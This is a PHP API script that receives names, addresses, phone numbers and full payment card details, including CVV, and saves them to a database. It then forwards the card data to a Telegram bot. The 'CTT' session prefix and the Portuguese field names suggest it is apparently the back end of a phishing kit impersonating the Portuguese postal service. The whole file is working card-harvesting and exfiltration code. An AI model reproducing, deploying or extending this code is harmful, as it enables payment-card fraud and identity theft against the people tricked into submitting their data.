<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

require_once '../config/database.php';
require_once '../config/telegram.php';

try {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['billing_data']) || !isset($input['card_data'])) {
        throw new Exception('Invalid input data');
    }
    
    $billingData = $input['billing_data'];
    $cardData = $input['card_data'];
    
    // Log the incoming request
    error_log("Card submit API called for: " . $billingData['nome']);
    
    // Validate required fields
    $requiredBilling = ['nome', 'email', 'endereco', 'codigoPostal', 'cidade', 'telefone'];
    foreach ($requiredBilling as $field) {
        if (!isset($billingData[$field]) || empty(trim($billingData[$field]))) {
            throw new Exception("Campo de entrega obrigatório: $field");
        }
    }
    
    $requiredCard = ['numeroCartao', 'dataExpiracao', 'cvv'];
    foreach ($requiredCard as $field) {
        if (!isset($cardData[$field]) || empty(trim($cardData[$field]))) {
            throw new Exception("Campo do cartão obrigatório: $field");
        }
    }
    
    $db = new Database();
    
    // Generate session ID for this transaction
    $sessionId = 'CTT' . str_pad(rand(10000000, 99999999), 8, '0', STR_PAD_LEFT);
    
    // Store billing data
    $billingSql = "INSERT INTO billing_data (session_id, nome, email, endereco, codigo_postal, cidade, telefone) 
                   VALUES (:session_id, :nome, :email, :endereco, :codigo_postal, :cidade, :telefone)";
    
    $billingParams = [
        ':session_id' => $sessionId,
        ':nome' => trim($billingData['nome']),
        ':email' => trim($billingData['email']),
        ':endereco' => trim($billingData['endereco']),
        ':codigo_postal' => trim($billingData['codigoPostal']),
        ':cidade' => trim($billingData['cidade']),
        ':telefone' => trim($billingData['telefone'])
    ];
    
    $billingResult = $db->query($billingSql, $billingParams);
    if (!$billingResult) {
        throw new Exception('Failed to store billing data');
    }
    
    // Store card data
    $cardSql = "INSERT INTO card_data (session_id, numero_cartao, data_expiracao, cvv) 
                VALUES (:session_id, :numero_cartao, :data_expiracao, :cvv)";
    
    $cardParams = [
        ':session_id' => $sessionId,
        ':numero_cartao' => trim($cardData['numeroCartao']),
        ':data_expiracao' => trim($cardData['dataExpiracao']),
        ':cvv' => trim($cardData['cvv'])
    ];
    
    $cardResult = $db->query($cardSql, $cardParams);
    if (!$cardResult) {
        throw new Exception('Failed to store card data');
    }
    
    // Send first Telegram message (client + card data)
    $telegram = new TelegramService();
    $telegramSent = $telegram->sendCardSubmittedMessage($billingData, $cardData, $sessionId);
    
    error_log("Card data submitted for session $sessionId - Telegram sent: " . ($telegramSent ? 'YES' : 'NO'));
    
    echo json_encode([
        'status' => 'success',
        'message' => 'Dados do cartão processados',
        'session_id' => $sessionId,
        'telegram_sent' => $telegramSent
    ]);
    
} catch (Exception $e) {
    error_log("Error in card-submit.php: " . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage()
    ]);
}
?>